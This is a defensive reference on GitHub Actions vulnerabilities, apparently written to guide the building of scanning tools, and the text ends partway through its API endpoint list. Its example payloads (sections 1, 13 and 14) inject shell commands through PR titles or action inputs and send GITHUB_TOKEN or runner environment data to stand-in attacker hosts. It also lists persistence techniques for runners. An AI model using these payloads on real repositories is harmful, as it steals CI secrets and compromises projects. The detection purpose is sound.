# GitHub Actions Security Vulnerabilities: Detection Reference

> Knowledge base for implementing MCP tool checks against GitHub Actions misconfigurations and attack vectors.
> Compiled from 40+ sources including GitHub Security Lab, OpenSSF, Unit42, Legit Security, StepSecurity, and primary security researchers (2024-2026).

---

## Table of Contents

1. [Script Injection via Untrusted Inputs](#1-script-injection-via-untrusted-inputs)
2. [pull_request_target + Checkout Misuse (PWN Requests)](#2-pull_request_target--checkout-misuse-pwn-requests)
3. [Unpinned Third-Party Actions](#3-unpinned-third-party-actions)
4. [GITHUB_TOKEN Over-Permission](#4-github_token-over-permission)
5. [Self-Hosted Runner Security](#5-self-hosted-runner-security)
6. [Artifact Poisoning (ArtiPACKED)](#6-artifact-poisoning-artipacked)
7. [Environment Protection Bypass](#7-environment-protection-bypass)
8. [Fork PR Workflow Execution Settings](#8-fork-pr-workflow-execution-settings)
9. [Reusable Workflow Trust Boundaries](#9-reusable-workflow-trust-boundaries)
10. [Cache Poisoning](#10-cache-poisoning)
11. [OIDC Token Misuse](#11-oidc-token-misuse)
12. [workflow_run Event Chain Attacks](#12-workflow_run-event-chain-attacks)
13. [Composite Action Security](#13-composite-action-security)
14. [Secret Exfiltration via Workflow Logs](#14-secret-exfiltration-via-workflow-logs)
15. [if: Conditions Bypass](#15-if-conditions-bypass)
16. [Supply Chain Attacks on Popular Actions](#16-supply-chain-attacks-on-popular-actions)
17. [Weakness Taxonomy (10 Categories with CWE References)](#17-weakness-taxonomy)
18. [Scanner Comparison Matrix](#18-scanner-comparison-matrix)
19. [Gap Analysis](#19-gap-analysis)
20. [GitHub API Endpoint Reference](#20-github-api-endpoint-reference)
21. [Key Researchers and References](#21-key-researchers-and-references)

---

## 1. Script Injection via Untrusted Inputs

**Severity:** CRITICAL

**How it works:** GitHub Actions expressions `${{ }}` are evaluated and substituted with their resulting values *before* the shell script runs. An attacker who controls the value (e.g., by setting a PR title to `"; curl https://evil.com/exfil?t=$GITHUB_TOKEN; #`) gets arbitrary code execution on the runner.

**Attack scenario:**
1. Repository has a workflow with `run: echo "PR title: ${{ github.event.pull_request.title }}"`
2. Attacker opens a PR with title: `a]"; curl https://attacker.com?t=$(cat /proc/self/environ | base64); #`
3. The expression is interpolated before bash execution, resulting in command injection
4. Secrets, GITHUB_TOKEN, and runner environment are exfiltrated

**Complete list of untrusted input contexts (all user-controllable):**

| Context Path | Controlled By |
|---|---|
| `github.event.issue.title` | Issue author |
| `github.event.issue.body` | Issue author |
| `github.event.pull_request.title` | PR author |
| `github.event.pull_request.body` | PR author |
| `github.event.comment.body` | Commenter |
| `github.event.review.body` | Reviewer |
| `github.event.pages.*.page_name` | Wiki editor |
| `github.event.commits.*.message` | Committer |
| `github.event.head_commit.message` | Committer |
| `github.event.head_commit.author.email` | Committer (git config) |
| `github.event.head_commit.author.name` | Committer (git config) |
| `github.event.commits.*.author.email` | Committer |
| `github.event.commits.*.author.name` | Committer |
| `github.event.pull_request.head.ref` | PR author (branch name) |
| `github.event.pull_request.head.label` | PR author |
| `github.event.pull_request.head.repo.default_branch` | Fork owner |
| `github.head_ref` | PR author |
| `github.event.workflow_run.head_branch` | Triggering workflow |
| `github.event.workflow_run.head_commit.message` | Committer |
| `github.event.discussion.title` | Discussion author |
| `github.event.discussion.body` | Discussion author |

**Detection patterns in workflow YAML:**
```yaml
# VULNERABLE: Direct interpolation of untrusted input in run blocks
run: echo "${{ github.event.issue.title }}"
run: echo "${{ github.event.pull_request.body }}"
run: |
  BRANCH="${{ github.head_ref }}"
run: |
  git commit -m "${{ github.event.head_commit.message }}"

# ALSO VULNERABLE: In `with:` passed to actions using `run`
with:
  script: |
    console.log("${{ github.event.comment.body }}")
```

**Detection regex:**
```
\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|pages|commits|head_commit|discussion|workflow_run)\.|head_ref)
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/contents/.github/workflows/{file}` -- retrieve workflow YAML content
- `GET /repos/{owner}/{repo}/actions/workflows` -- list all workflows to enumerate files
- `GET /repos/{owner}/{repo}/git/trees/{branch}?recursive=1` -- find all `.github/workflows/*.yml` files

**Programmatic detection:** Parse YAML, search all `run:` blocks and `with:` inputs for `${{ github.event.*` patterns matching untrusted contexts.

---

## 2. pull_request_target + Checkout Misuse (PWN Requests)

**Severity:** CRITICAL

**How it works:** The `pull_request_target` event runs in the context of the *base* repository (not the fork), granting write permissions and access to secrets. If the workflow checks out the PR's HEAD code (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`), it executes attacker-controlled code with full privileges.

**Attack scenario:**
1. Repository has workflow triggered by `pull_request_target` that checks out PR code
2. Attacker forks the repo, modifies build scripts / Makefile / package.json scripts
3. Opens a PR -- the workflow runs the attacker's code with write access to the base repo and all its secrets
4. Attacker exfiltrates secrets, pushes malicious commits, or compromises releases

**Real-world impact:** Microsoft was assigned CVE-2025-61671 (CVSS 9.3) for this exact pattern. The SpotBugs/reviewdog chain attack in late 2024 used this vector to ultimately compromise tj-actions/changed-files, affecting 23,000+ repositories.

**Detection patterns in workflow YAML:**
```yaml
# CRITICAL: pull_request_target + checkout of PR code
on: pull_request_target

steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
      # or
      ref: ${{ github.event.pull_request.head.ref }}   # DANGEROUS
      # or
      ref: refs/pull/${{ github.event.number }}/merge  # DANGEROUS
```

**Programmatic detection:** Parse workflow YAML for trigger = `pull_request_target`, then check all steps for `actions/checkout` with `ref` containing `github.event.pull_request.head` or `refs/pull/`.

---

## 3. Unpinned Third-Party Actions

**Severity:** HIGH

**How it works:** Actions referenced by mutable tags (e.g., `@v4`, `@main`) can be silently modified by the action maintainer or an attacker who compromises the action's repository. Tags and branches are mutable Git references that can be moved to point to arbitrary commits. Only SHA pinning is immutable.

**Attack scenario:**
1. Popular action `someorg/action@v3` is used by thousands of workflows
2. Attacker gains access to action's repo (credential theft, compromised maintainer)
3. Attacker pushes malicious commit and moves all existing tags (`v3`, `v3.1.0`) to that commit
4. Every workflow using `@v3` now executes malicious code -- exact pattern of tj-actions/changed-files attack (March 2025, 23,000+ repos, CVE-2025-30066)

**"Unpinnable Actions" caveat:** Even SHA-pinned actions can be vulnerable if the action itself pulls a `latest`-tagged Docker image. The pinned commit may reference a Dockerfile that uses a mutable base image.

**Detection patterns in workflow YAML:**
```yaml
# VULNERABLE: Tag reference (mutable)
uses: actions/checkout@v4
uses: someorg/action@main
uses: someorg/action@v3.1.0

# SAFE: SHA pinned
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# STILL AT RISK: SHA-pinned but action pulls :latest Docker image internally
```

**Detection regex:**
```
uses:\s+[\w\-\.]+/[\w\-\.]+@(?![0-9a-f]{40})
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/contents/.github/workflows/{file}` -- parse `uses:` directives
- `GET /repos/{action_owner}/{action_repo}/git/ref/tags/{tag}` -- verify tag integrity
- `GET /repos/{action_owner}/{action_repo}/advisories` -- check for known vulnerabilities

---

## 4. GITHUB_TOKEN Over-Permission

**Severity:** HIGH

**How it works:** The GITHUB_TOKEN is automatically created for each workflow run. Organizations created before February 2023 default to read-write permissions. Without explicit `permissions:` declarations at the workflow or job level, the token grants write access to all scopes (contents, issues, PRs, packages, etc.), enabling privilege escalation if any step is compromised.

**Detection patterns in workflow YAML:**
```yaml
# VULNERABLE: No permissions block at all (inherits org/repo default)
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps: ...

# VULNERABLE: Explicit write-all
permissions: write-all

# VULNERABLE: Overly broad permissions
permissions:
  contents: write
  packages: write
  issues: write
  pull-requests: write

# SAFE: Least privilege
permissions:
  contents: read
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/contents/.github/workflows/{file}` -- check for `permissions:` block
- `GET /repos/{owner}/{repo}/actions/permissions/workflow` -- get default workflow permissions (returns `default_workflow_permissions: "read"|"write"` and `can_approve_pull_request_reviews`)
- `GET /orgs/{org}/actions/permissions/workflow` -- org-level defaults
- `PUT /repos/{owner}/{repo}/actions/permissions/workflow` -- fix: set to read-only default

**Programmatic detection:** Parse workflow YAML. If no top-level or job-level `permissions:` key exists, the workflow relies on org/repo defaults (which may be `write`). Call the permissions API to check the default. Flag `permissions: write-all` or any permission set broader than what the job requires.

---

## 5. Self-Hosted Runner Security

**Severity:** CRITICAL

**How it works:** Self-hosted runners are persistent machines that may not be ephemeral. If a workflow executes attacker-controlled code on a self-hosted runner, the attacker can install persistent backdoors, access internal networks, and steal credentials from other workflow runs.

**Persistence techniques:**
- Setting `RUNNER_TRACKING_ID` to bypass orphan process cleanup
- Modifying runner configuration files
- Installing systemd services
- Modifying PATH/LD_PRELOAD for future runs
- Accessing other repos' secrets that run on the same runner

**Detection patterns in workflow YAML:**
```yaml
# HIGH RISK: Self-hosted runner on public repo
runs-on: self-hosted
runs-on: [self-hosted, linux]
runs-on: [self-hosted, ARM64]

# COMBINED WITH dangerous triggers = CRITICAL
on: pull_request_target
jobs:
  build:
    runs-on: self-hosted  # Attacker code on your infra
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/runners` -- list self-hosted runners
- `GET /orgs/{org}/actions/runners` -- list org-level runners
- `GET /repos/{owner}/{repo}/actions/runners/{runner_id}` -- runner details (OS, labels, status)
- `GET /repos/{owner}/{repo}` -- check `visibility` field (public repos + self-hosted = critical)

**Programmatic detection:** Check if `runs-on` contains `self-hosted` in any workflow. Cross-reference with repo visibility (public = critical risk). Flag combinations with dangerous triggers.

---

## 6. Artifact Poisoning (ArtiPACKED)

**Severity:** HIGH

**How it works:** Artifacts generated during workflow runs can be downloaded by other workflows or users. Multiple attack vectors exist: (a) uploading the entire checkout directory accidentally includes `.git/config` with GITHUB_TOKEN, (b) a race condition in artifacts v4 allows download while the workflow is still running, (c) a malicious PR can poison artifacts consumed by privileged `workflow_run` workflows.

**Real-world impact (Unit42, August 2024):** Affected projects included Google Firebase JS SDK (1.6M dependent projects), Microsoft, Red Hat. GitHub categorized the issue as informational.

**Detection patterns in workflow YAML:**
```yaml
# VULNERABLE: Uploading checkout directory
- uses: actions/checkout@v4
- uses: actions/upload-artifact@v4
  with:
    path: .          # Entire working dir including .git/
    # or
    path: ${{ github.workspace }}

# VULNERABLE: Artifact consumed by workflow_run without validation
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
steps:
  - uses: actions/download-artifact@v4
  - run: bash ./downloaded/script.sh  # Executing untrusted artifact content
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/artifacts` -- list artifacts (check names/sizes for suspicious patterns)
- `GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts` -- per-run artifacts

---

## 7. Environment Protection Bypass

**Severity:** MEDIUM

**How it works:** GitHub Environments can require approvals and restrict deployments to specific branches. However, misconfigurations allow bypasses: (a) no branch restrictions on the environment, (b) admin bypass capability, (c) workflows that don't actually reference the environment for sensitive operations, (d) `pull_request_target` running in the base context can access environment secrets.

**Detection patterns in workflow YAML:**
```yaml
# CHECK: Environment used without branch protection
jobs:
  deploy:
    environment: production  # Is this env restricted to specific branches?
    runs-on: ubuntu-latest

# RISK: Secrets used outside environment protection
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.PROD_API_KEY }}  # Secret not protected by environment
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/environments` -- list all environments
- `GET /repos/{owner}/{repo}/environments/{env_name}` -- get protection rules (reviewers, wait_timer, deployment_branch_policy)
- `GET /repos/{owner}/{repo}/environments/{env_name}/deployment-branch-policies` -- check which branches can deploy
- `GET /repos/{owner}/{repo}/environments/{env_name}/deployment_protection_rules` -- custom protection rules

**Programmatic detection:** For each environment, check `deployment_branch_policy`. If null/empty, any branch can deploy. Check if `protection_rules` includes required reviewers. Cross-reference with workflows that use the environment.

---

## 8. Fork PR Workflow Execution Settings

**Severity:** HIGH

**How it works:** By default, GitHub Actions from fork PRs require approval before running. If this is misconfigured to "Run workflows from fork pull requests" without approval, any external contributor can trigger workflows that may have access to secrets (especially with `pull_request_target`).

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/permissions` -- get Actions permission settings
- `GET /orgs/{org}/actions/permissions` -- org-level Actions permissions
- `GET /repos/{owner}/{repo}/actions/permissions/access` -- access level for outside workflows

**Programmatic detection:** Query the repository and organization Actions permissions. Check if fork PR workflows require approval. Flag repositories where `pull_request_target` workflows exist but fork PR approval is not required.

---

## 9. Reusable Workflow Trust Boundaries

**Severity:** MEDIUM

**How it works:** Reusable workflows (`workflow_call`) can be called from other repositories. If a workflow passes `secrets: inherit` to an external reusable workflow, all repository secrets become accessible to that external workflow. Additionally, OIDC `job_workflow_ref` claims can be misconfigured to not restrict which reusable workflows can assume cloud roles.

**Detection patterns in workflow YAML:**
```yaml
# RISKY: Inheriting all secrets to external workflow
jobs:
  deploy:
    uses: external-org/workflows/.github/workflows/deploy.yml@main
    secrets: inherit  # ALL secrets passed to external repo

# RISKY: External workflow on mutable ref
jobs:
  build:
    uses: external-org/workflows/.github/workflows/build.yml@main  # Not SHA-pinned

# SAFER:
jobs:
  build:
    uses: external-org/workflows/.github/workflows/build.yml@abc123def456
    secrets:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # Only specific secrets
```

**Programmatic detection:** Parse workflow YAML for jobs with `uses:` pointing to external repositories. Flag `secrets: inherit` with external workflows. Flag external workflow refs that are not SHA-pinned.

---

## 10. Cache Poisoning

**Severity:** HIGH

**How it works:** GitHub Actions cache (`actions/cache`) is shared across all branches within a repository. A workflow with even read-only permissions can write to the cache. An attacker who gets code execution on any branch (e.g., via a PR) can poison cache entries that are later consumed by privileged workflows on the default branch.

**Real-world impact (Adnan Khan, "Cacheract" -- May/December 2024):**
1. Attacker submits a PR to a project with `pull_request` trigger (non-privileged)
2. PR workflow runs and writes a poisoned cache entry (e.g., modified npm modules with backdoors)
3. Next workflow run on `main` restores the poisoned cache
4. Backdoored dependencies execute in the context of the main branch with write permissions and secrets
5. Advanced: Cacheract extracts GITHUB_TOKEN, ACTIONS_RUNTIME_TOKEN from runner memory and deploys additional payloads for OIDC abuse

**Detection patterns in workflow YAML:**
```yaml
# PRESENT: Any use of caching without integrity verification
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}

- uses: actions/setup-node@v4
  with:
    cache: 'npm'  # Implicit caching

# HIGH RISK indicators:
# - Cache used in workflows triggered by pull_request (writable from forks)
# - No cache validation/checksum verification after restore
# - Cache key uses predictable/controllable inputs
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/caches` -- list caches (check for suspicious sizes, recent creation from non-default branches)
- `DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}` -- remediation: delete suspicious caches

---

## 11. OIDC Token Misuse

**Severity:** CRITICAL

**How it works:** GitHub Actions can request OIDC tokens to authenticate with cloud providers (AWS, Azure, GCP) without static secrets. Misconfigured trust policies on the cloud side allow unauthorized workflows to assume cloud roles. Common mistake: not restricting the `subject` claim, allowing any repo or branch to assume the role.

**Attack scenario:**
1. AWS IAM role trusts GitHub OIDC provider but condition only checks `aud` (audience), not `sub` (subject)
2. Any GitHub Actions workflow in any repository can request a token and assume this IAM role
3. Attacker creates a public repo, triggers a workflow that requests an OIDC token with the correct audience
4. Attacker assumes the IAM role and gains access to cloud resources (S3, EC2, secrets, etc.)

**Detection patterns in workflow YAML:**
```yaml
# REQUIRED: Workflow must have id-token permission to get OIDC token
permissions:
  id-token: write  # Flag: Why does this workflow need OIDC?

# Common OIDC usage
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/my-role
    aws-region: us-east-1
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/oidc/customization/sub` -- get OIDC subject claim template customization
- `PUT /repos/{owner}/{repo}/actions/oidc/customization/sub` -- set subject template
- Cloud-side: AWS IAM `GetRole` / Azure `az ad sp show` / GCP `gcloud iam` to verify trust policies

**Programmatic detection:** Flag workflows with `id-token: write` permission. Cross-reference with cloud IAM trust policies to verify subject claim restrictions. Check if the subject template includes `repo:`, `ref:`, and `environment:` constraints.

---

## 12. workflow_run Event Chain Attacks

**Severity:** HIGH

**How it works:** The `workflow_run` event triggers a workflow after another workflow completes. The triggered workflow runs with write permissions and secret access, even if the triggering workflow (e.g., from a PR) had no such privileges. This creates privilege escalation chains.

**Attack scenario:**
1. Repository has a `pull_request` workflow ("Build") that creates artifacts
2. A `workflow_run` workflow ("Deploy") triggers when "Build" completes, downloads artifacts, and deploys
3. Attacker's PR modifies the "Build" workflow to produce poisoned artifacts
4. "Deploy" runs with write permissions, downloads the poisoned artifact, and executes it
5. Attacker achieves code execution with elevated privileges

**Detection patterns in workflow YAML:**
```yaml
# RISKY: workflow_run consuming artifacts from untrusted workflows
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
      - run: ./downloaded-script.sh  # Executing untrusted content

# ALSO RISKY: Using github.event.workflow_run context values
      - run: echo "${{ github.event.workflow_run.head_branch }}"  # Injection
      - run: echo "${{ github.event.workflow_run.head_commit.message }}"  # Injection
```

**Programmatic detection:** Identify all `workflow_run`-triggered workflows. Check if they download artifacts and execute their contents. Check if they interpolate `github.event.workflow_run.*` values in `run:` blocks. Map the chain: which workflows trigger which.

---

## 13. Composite Action Security

**Severity:** HIGH

**How it works:** Composite actions (defined in `action.yml` with `runs: using: composite`) execute steps in the caller's context. If a composite action interpolates user inputs into `run:` commands without sanitization, it creates injection vulnerabilities in every workflow that uses it. Composite actions also chain dependencies -- compromising one action in the chain compromises all consumers.

**Real-world impact (CVE-2026-26189, Trivy Action):**
1. Composite action writes `export VAR=${{ inputs.user_input }}` to a file and then sources it
2. Attacker passes input with shell metacharacters: `$(curl attacker.com?t=$GITHUB_TOKEN)`
3. When the file is sourced, the injection executes with the workflow's full permissions
4. Supply chain: reviewdog/action-setup was compromised, which was a composite action dependency of tj-actions -- all consumers were automatically affected

**Detection patterns in action.yml:**
```yaml
# VULNERABLE composite action
runs:
  using: composite
  steps:
    - run: echo "${{ inputs.user_data }}"  # Direct interpolation
      shell: bash
    - run: |
        echo "export RESULT=${{ inputs.query }}" >> env.sh
        source env.sh  # Sourcing file with injected content
      shell: bash
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/contents/action.yml` -- check for composite actions
- `GET /repos/{owner}/{repo}/contents/{path}/action.yml` -- nested actions

**Programmatic detection:** For all `uses:` references in workflows, fetch the action's `action.yml`. If `runs.using: composite`, parse all `run:` steps for `${{ inputs.*` interpolation. Flag any input that flows into shell commands without environment variable intermediation.

---

## 14. Secret Exfiltration via Workflow Logs

**Severity:** CRITICAL

**How it works:** GitHub masks known secret values in logs, but this protection can be bypassed in multiple ways: (a) encoding secrets before printing (base64, hex, reversing), (b) reading secrets from runner process memory (`/proc/self/environ`), (c) extracting the ACTIONS_RUNTIME_TOKEN which is not treated as a secret, (d) public repository logs are readable by anyone.

**Real-world impact (tj-actions/changed-files, March 2025):** Compromised action injected code that read runner process memory. Secrets were double-base64 encoded and printed to logs, bypassing GitHub's masking. GhostAction campaign (September 2025): 3,325 secrets stolen across 817 repositories.

**Detection patterns in workflow YAML:**
```yaml
# SUSPICIOUS: Environment dumping
- run: env
- run: printenv
- run: cat /proc/self/environ
- run: python3 -c "import os; print(os.environ)"
- run: set

# SUSPICIOUS: Encoding secrets
- run: echo "${{ secrets.TOKEN }}" | base64
- run: echo "${{ secrets.TOKEN }}" | rev
- run: echo "${{ secrets.TOKEN }}" | xxd

# SUSPICIOUS: Network exfiltration
- run: curl https://external-server.com?data=$SECRET
- run: wget -q -O- https://evil.com/collect
```

**GitHub API endpoints:**
- `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` -- download workflow run logs (check for encoded secrets)
- `GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs` -- list jobs in a run
- `GET /repos/{owner}/{repo}/actions/runs?status=completed` -- audit recent runs

**Programmatic detection:** Static: scan `run:` blocks for `env`, `printenv`, `/proc/`, `base64`, `curl`, `wget`, `nc` patterns. Runtime: download logs and scan for base64-encoded strings, hex dumps, or connections to external hosts not in an allowlist.

---

## 15. if: Conditions Bypass

**Severity:** MEDIUM

**How it works:** Workflow `if:` conditions control whether jobs or steps execute. Flawed conditions can be exploited: (a) conditions that are always true, (b) conditions that check untrusted input (injection via expression evaluation), (c) `issue_comment` trigger bypasses PR approval requirements, (d) missing conditions on sensitive steps.

**Detection patterns in workflow YAML:**
```yaml
# RISKY: issue_comment trigger (bypasses PR approval)
on: issue_comment
jobs:
  deploy:
    if: github.event.comment.body == '/deploy'  # Any commenter can trigger

# RISKY: Always-true conditions
if: always()  # Step runs even if previous steps fail (may skip security checks)
if: true
if: ${{ true }}

# RISKY: Condition on untrusted input
if: contains(github.event.pull_request.title, 'safe')

# RISKY: Missing condition on sensitive step
steps:
  - run: deploy-to-prod.sh  # No if: condition checking context
```

**Programmatic detection:** Parse all `if:` expressions. Flag: `always()`, conditions referencing untrusted event data, `issue_comment` triggers combined with privileged operations, and jobs with `environment:` references but no proper `if:` gate.

---

## 16. Supply Chain Attacks on Popular Actions

**Severity:** CRITICAL

**How it works:** When a popular GitHub Action is compromised (via stolen credentials, social engineering, or dependency chain attacks), every repository using that action becomes a victim. Attackers modify the action's code and retag existing versions to point to the malicious commit.

**Major incidents (2024-2025):**

| Incident | Date | Impact | CVE |
|---|---|---|---|
| tj-actions/changed-files | March 2025 | 23,000+ repos, secrets dumped to logs | CVE-2025-30066 |
| reviewdog/action-setup | Late 2024 | Chain attack via SpotBugs | -- |
| Ultralytics/actions | 2024 | Cryptomining code injected via cache poisoning | -- |
| GhostAction campaign | September 2025 | 3,325 secrets stolen, 817 repos, 327 users | -- |
| CodeQLEAKED | 2024 | GitHub's own CodeQL supply chain compromise | -- |

**GitHub API endpoints:**
- `GET /advisories?ecosystem=actions` -- query known compromised actions
- `GET /repos/{action_owner}/{action_repo}/advisories` -- check for security advisories
- `GET /repos/{action_owner}/{action_repo}/commits/{sha}` -- verify commit exists and is legitimate

---

## 17. Weakness Taxonomy

10 weakness categories identified in the systematic study "Unpacking Security Scanners for GitHub Actions Workflows" (arXiv:2601.14455, January 2026):

| # | Category | Code | CWE Reference | Description |
|---|---|---|---|---|
| 1 | Injection | IW | CWE-94 (Code Injection), CWE-78 (OS Command Injection) | Untrusted input interpolated into shell commands via `${{ }}` expressions |
| 2 | Excessive Permission | EPW | CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment) | GITHUB_TOKEN with write-all or no explicit least-privilege `permissions:` block |
| 3 | Unpinned Dependency | UDW | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) | Actions referenced by mutable tag/branch instead of immutable SHA |
| 4 | Trigger Misuse | TMW | CWE-284 (Improper Access Control) | Dangerous event triggers (`pull_request_target`, `workflow_run`, `issue_comment`) without proper safeguards |
| 5 | Secrets Exposure | SEW | CWE-200 (Exposure of Sensitive Information), CWE-312 (Cleartext Storage of Sensitive Information) | Secrets leaked via logs, artifacts, environment variables, or encoded output |
| 6 | Artifact Integrity | AIW | CWE-494 (Download of Code Without Integrity Check) | Artifacts consumed without validation, ArtiPACKED race condition, poisoned downloads |
| 7 | Control Flow | CFW | CWE-670 (Always-Incorrect Control Flow Implementation) | Flawed `if:` conditions, `always()` bypassing security gates, missing condition checks |
| 8 | Known Vulnerable Component | KVCW | CWE-1395 (Dependency on Vulnerable Third-Party Component) | Using actions with known security advisories or CVEs |
| 9 | Hardening Gap | HGW | CWE-693 (Protection Mechanism Failure) | Missing branch protection, no code review enforcement, no SAST in pipeline |
| 10 | Runner Compatibility | GRCW | CWE-758 (Reliance on Undefined Behavior) | Self-hosted runner misconfigurations, non-ephemeral runners, public repo exposure |

---

## 18. Scanner Comparison Matrix

### Primary Scanners

| Scanner | Language | Speed | Open Source | Focus Areas |
|---|---|---|---|---|
| **actionlint** | Go | 0.39s | Yes | Syntax validation, injection detection, permissions checks, hardcoded secrets, control flow |
| **zizmor** | Rust | 0.23s | Yes | Injection, permissions, mutable refs, security advisories, trigger misuse, secret handling |
| **Scorecard** (OpenSSF) | Go | 1.37s | Yes | Token permissions, pinned deps, dangerous workflows, branch protection, SAST checks |
| **poutine** | Go | -- | Yes | Injection, self-hosted runners, artifact integrity, trigger misuse, control flow analysis |
| **Semgrep** | OCaml | -- | Yes | Injection patterns, trigger misuse (via custom rules) |
| **ggshield** | Python | -- | Partial | Secrets exposure (hardcoded credentials in workflow files and logs) |
| **Frizbee** | Go | -- | Yes | Unpinned dependencies only |
| **Pinny** | Go | -- | Yes | Unpinned dependencies only |
| **Scharf** | Go | -- | Yes | Unpinned dependencies only |

### Coverage Matrix by Weakness Category

| Weakness Category | actionlint | zizmor | Scorecard | poutine | Semgrep | ggshield | Frizbee/Pinny/Scharf |
|---|---|---|---|---|---|---|---|
| Injection (IW) | Yes | Yes | Yes | Yes | Yes | -- | -- |
| Excessive Permission (EPW) | Yes | Yes | Yes | Yes | -- | -- | -- |
| Unpinned Dependency (UDW) | Yes | Yes | Yes | -- | -- | -- | Yes |
| Trigger Misuse (TMW) | -- | Yes | Yes | Yes | Yes | -- | -- |
| Secrets Exposure (SEW) | Yes | Yes | -- | Yes | -- | Yes | -- |
| Artifact Integrity (AIW) | -- | Yes | -- | Yes | -- | -- | -- |
| Control Flow (CFW) | Yes | -- | -- | Yes | -- | -- | -- |
| Known Vulnerable Component (KVCW) | -- | -- | -- | Yes | -- | -- | -- |
| Hardening Gap (HGW) | -- | -- | Yes | -- | -- | -- | -- |
| Runner Compatibility (GRCW) | Yes | -- | -- | -- | -- | -- | -- |

### OpenSSF Scorecard Checks (GitHub Actions relevant)

| Check | What It Detects |
|---|---|
| **Dangerous-Workflow** | `pull_request_target`/`workflow_run` with PR checkout, untrusted input interpolation |
| **Token-Permissions** | Missing or overly permissive `permissions:` block, write-all defaults |
| **Pinned-Dependencies** | Unpinned actions (tag vs SHA), unpinned Docker images, unpinned pip/npm in scripts |
| **Branch-Protection** | Missing branch protection rules, unsigned commits, force push allowed |
| **Code-Review** | PRs merged without review |
| **SAST** | Static analysis tools configured in CI |
| **Vulnerabilities** | Known vulnerabilities in dependencies |
| **CI-Tests** | Tests running in CI pipeline |
| **Dependency-Update-Tool** | Dependabot/Renovate configured |

### Runtime Security: StepSecurity Harden-Runner

StepSecurity provides the only runtime security agent for GitHub Actions:
- **Network egress monitoring:** Detects unauthorized outbound connections (caught the tj-actions/changed-files breach)
- **File integrity monitoring:** Detects source code modifications during builds
- **Process monitoring:** Tracks process execution per step/job/workflow
- **Anomaly detection:** GitHub Checks integration that fails PRs with suspicious activity
- **SIEM export:** Export to Amazon S3 for integration with security platforms
- Supports Linux, Windows, and macOS runners

### GitHub's Built-in Security Features

| Feature | What It Covers |
|---|---|
| **Code Scanning (CodeQL)** | Detects injection patterns in workflow files |
| **Secret Scanning** | Detects committed secrets in repo/logs |
| **Dependabot** | Updates action versions, creates PRs for outdated actions |
| **Fork PR approval** | Requires approval before running fork PR workflows |
| **Required workflows** | Org-level mandatory workflows |
| **SHA pinning policy** | Enforces SHA-pinned actions (August 2025) |
| **pull_request_target fix** | Now always uses default branch for workflow source (December 2025) |

---

## 19. Gap Analysis

What no existing tool fully covers:

| Gap | Description | Why It Matters |
|---|---|---|
| **OIDC trust policy audit** | Cloud-side IAM role trust policies are not checked by any workflow scanner | Requires cross-platform cloud API integration (AWS IAM, Azure AD, GCP IAM) |
| **Artifact content validation** | No tool verifies integrity of downloaded artifacts before execution | ArtiPACKED and workflow_run chain attacks exploit this |
| **Cache integrity** | No built-in verification that cached dependencies haven't been tampered with | Cacheract demonstrates full compromise via cache poisoning |
| **Composite action chain analysis** | Transitive dependency analysis of composite actions is incomplete | Partial in poutine; reviewdog/tj-actions chain attack proves the risk |
| **Runtime behavior monitoring** | Only StepSecurity Harden-Runner provides this, requires installation | Not available via static analysis; needed for zero-day detection |
| **Cross-repository trust mapping** | No tool maps the full trust graph of reusable workflows + secrets inheritance | `secrets: inherit` to external workflows is a blind spot |
| **Environment protection audit** | No scanner checks if deployment environments have proper branch restrictions | API-based detection needed; misconfiguration allows any-branch deployment |
| **Self-hosted runner hygiene** | No tool verifies runners are ephemeral or properly isolated | Requires infrastructure-level audit beyond workflow YAML |
| **workflow_run chain analysis** | Mapping privilege escalation chains across workflow triggers is incomplete | Partial in poutine; full chain mapping needs workflow graph construction |

---

## 20. GitHub API Endpoint Reference

### Workflow Analysis
```
GET /repos/{owner}/{repo}/actions/workflows                    # List all workflows
GET /repos/{owner}/{repo}/actions/workflows/{id}               # Get specific workflow
GET /repos/{owner}/{repo}/contents/.github/workflows/{file}    # Get workflow YAML content
GET /repos/{owner}/{repo}/git/trees/{branch}?recursive=1       # Find all workflow files
```

### Permissions & Configuration
```
GET /repos/{owner}/{repo}/actions/permissions                  # Actions permission policy
GET /repos/{owner}/{repo}/actions/permissions/workflow         # Default GITHUB_TOKEN permissions
GET /repos/{owner}/{repo}/actions/permissions/access           # Outside workflow access level
GET /orgs/{org}/actions/permissions                            # Org-level Actions permissions
GET /orgs/{org}/actions/permissions/workflow                   # Org-level token defaults
PUT /repos/{owner}/{repo}/actions/permissions/workflow         # Set token defaults (remediation)
```

### Runners
```
GET /repos/{owner}/{repo}/actions/runners                      # List self-hosted runners
